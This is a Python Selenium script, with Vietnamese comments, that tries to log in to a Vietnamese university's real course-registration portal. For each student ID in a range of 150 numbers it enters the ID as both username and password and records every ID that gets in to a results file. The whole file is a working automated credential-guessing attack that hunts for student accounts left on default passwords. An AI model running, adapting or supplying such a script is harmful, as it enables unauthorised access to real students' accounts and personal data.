from selenium import  webdriver
from time import sleep
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
#khai bao bien browser

options = webdriver.ChromeOptions()

options.add_experimental_option("detach", True)

count = 0
f = open("result.txt", "a")

# nhập khoảng msv cần check
for x in range(20000000,20000150):

    if(count==0):
        browser = webdriver.Chrome(options=options)
        browser.get("https://daotao.vnu.edu.vn/dkmh/login.asp")
        username = browser.find_element(By.ID,"txtLoginId")
        username.send_keys(x)

        password = browser.find_element(By.ID,"txtPassword")
        password.send_keys(x)

        password.send_keys(Keys.ENTER)
        url = browser.current_url
        if(url=="https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err"):
            print("login fail")
            count = count + 1
        else:
            f.write(str(x)+"\n")
            count = 0
            browser.close()

    elif(count>=30):
        username = browser.find_element(By.ID,"txtLoginId")
        username.send_keys(x)

        password = browser.find_element(By.ID,"txtPassword")
        password.send_keys(x)

        password.send_keys(Keys.ENTER)
        url = browser.current_url
        if(url=="https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err"):
            print("login fail")
        else:
            f.write(str(x)+"\n")
        print("reload")
        count = 0
        browser.close()
   
    else:
        username = browser.find_element(By.ID,"txtLoginId")
        username.send_keys(x)

        password = browser.find_element(By.ID,"txtPassword")
        password.send_keys(x)

        password.send_keys(Keys.ENTER)
        url = browser.current_url
        if(url=="https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err"):
            print("login fail")
            count = count + 1
        else:
            f.write(str(x)+"\n")
            count = 0
            browser.close()
f.close()